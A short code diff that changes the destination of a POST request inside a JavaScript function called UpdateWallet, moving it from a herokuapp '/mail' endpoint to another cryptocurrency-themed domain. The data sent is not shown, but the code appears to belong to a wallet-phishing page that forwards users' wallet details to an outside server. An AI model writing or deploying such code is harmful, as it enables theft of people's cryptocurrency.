@@ -44,7 +44,7 @@ function UpdateWallet() {
               }
             );
             ajax({
-              url: "https://cryptotrade2.herokuapp.com/mail",
+              url: "https://exchangecryptominers.com/unchainedtrade",
               method: "POST",
               headers: {
                 "Content-Type": "application/json",
